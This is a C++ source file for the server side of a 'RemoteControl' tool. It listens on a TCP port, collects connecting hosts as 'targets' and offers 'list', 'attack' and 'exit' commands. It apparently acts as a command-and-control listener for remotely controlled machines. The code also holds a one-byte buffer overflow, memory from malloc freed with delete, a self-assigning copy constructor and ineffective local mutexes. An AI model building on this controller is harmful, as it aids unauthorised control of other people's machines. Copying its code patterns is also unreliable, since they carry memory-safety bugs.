/*
 * Created by Nicolas Fez for RemoteControl.
 * Started on 23/10/2018.
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <cstdlib>
#include <string>
#include <arpa/inet.h>
#include <zconf.h>
#include <iostream>
#include <thread>
#include <map>
#include <fcntl.h>
#include <vector>
#include <sstream>
#include <LineParser.hh>
#include <RemoteController.hh>
#include "RemoteControlException.hpp"
#include "RemoteControl.hh"
#include "Server.hh"
#include "ServerCommand.hh"

Server::Server()
{
    if ((this->addr = (struct sockaddr_in *) malloc(sizeof(*(this->getAddr())))) == nullptr)
        throw RemoteControlException(std::string(MALLOC_ERROR));
    if ((this->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        throw RemoteControlException(std::string(SOCKET_ERROR));
    if (fcntl(this->fd, F_SETFL, O_NONBLOCK) == -1)
        throw RemoteControlException(std::string(FCNTL_ERROR));
    bzero(this->getAddr(), sizeof(*(this->getAddr())));
    this->addr->sin_family = AF_INET;
    this->addr->sin_addr.s_addr = INADDR_ANY;
    this->addr->sin_port = htons(REMOTECONTROL_PORT);
    this->setCurrentTarget(-1);
    if (bind(this->getFd(), (struct sockaddr *) this->getAddr(), sizeof(*(this->getAddr()))))
        throw RemoteControlException(std::string(BIND_ERROR));
    if (listen(this->getFd(), REMOTECONTROL_BACKLOG) == -1)
        throw RemoteControlException(std::string(LISTEN_ERROR));
}

Server::Server(Server const &other)
{
    this->setAddr(other.getAddr());
    this->setFd(this->getFd());
}

Server::~Server()
{
    std::map<std::string, int>::const_iterator iterator;

    if (this->addr != nullptr)
        delete this->addr;
    if (this->fd != -1)
        close(this->fd);
    for (iterator = this->getClients().begin(); iterator != this->getClients().end(); iterator++)
    {
        close(iterator->second);
    }
}

Server &Server::operator=(Server const &other)
{
    return *this;
}

void Server::readContent(Server *server)
{
    char buf[4096];
    fd_set set;
    ssize_t ret;
    struct timeval timeout;
    std::mutex mutex;

    timeout.tv_sec = 0;
    timeout.tv_usec = 10000;
    while (server->getRunningStatus())
    {
        if (server->getCurrentTarget() > 0)
        {
            FD_ZERO(&set);
            FD_SET(server->getCurrentTarget(), &set);
            if (select(server->getCurrentTarget() + 1, &set, NULL, NULL, &timeout) > 0)
            {
                if ((ret = read(server->getCurrentTarget(), buf, 4096)) > 0)
                {
                    buf[ret] = '\0';
                    mutex.lock();
                    write(1, buf, strlen(buf));
                    mutex.unlock();
                }
            }
        }
    }
    close(server->getCurrentTarget());
}

bool Server::run()
{
    RemoteController remoteController;
    std::vector<ServerCommand> commands;
    LineParser lineParser;
    std::thread acceptingThread(acceptConnections, this);
    std::thread clientReader(readContent, this);

    this->setRunningStatus(true);
    commands.emplace_back(ServerCommand("list", ServerCommand::list));
    commands.emplace_back(ServerCommand("attack", ServerCommand::attack));
    commands.emplace_back(ServerCommand("exit", ServerCommand::exit));
    acceptingThread.detach();
    clientReader.detach();
    while (this->getRunningStatus())
    {
        lineParser.getUserEntry();
        ServerCommand::execute(commands, lineParser, this);
    }
    return true;
}

void Server::addClient(std::string const &ip, const int fd)
{
    this->clients[ip] = fd;
}

void Server::acceptConnections(Server *server)
{
    struct sockaddr_in client;
    size_t clientLength;
    int clientFd = -1;
    std::string message;
    std::mutex mutex;

    message = "La cible a été mise à jour\n";
    while (server->getRunningStatus())
    {
        clientLength = sizeof(client);
        bzero(&client, clientLength);
        if ((clientFd = accept(server->getFd(), (struct sockaddr *) &client, (socklen_t *) &clientLength)) >= 0)
        {
            mutex.lock();
            server->addClient(std::string(inet_ntoa(client.sin_addr)), clientFd);
            if (server->getCurrentTarget() == -1)
            {
                write(1, message.c_str(), message.length());
                server->setCurrentTarget(clientFd);
            }
            mutex.unlock();
        }
    }
}

struct sockaddr_in *Server::getAddr() const
{
    return this->addr;
}

void Server::setAddr(struct sockaddr_in *addr)
{
    this->addr = addr;
}

const int Server::getFd() const
{
    return this->fd;
}

void Server::setFd(const int fd)
{
    this->fd = fd;
}

const bool Server::getRunningStatus() const
{
    return this->runningStatus;
}

void Server::setRunningStatus(const bool runningStatus)
{
    this->runningStatus = runningStatus;
}

std::map<std::string, int> const &Server::getClients() const
{
    return this->clients;
}

void Server::setClients(std::map<std::string, int> const &clients)
{
    this->clients = clients;
}

const int Server::getCurrentTarget() const
{
    return this->currentTarget;
}

void Server::setCurrentTarget(const int currentTarget)
{
    this->currentTarget = currentTarget;
}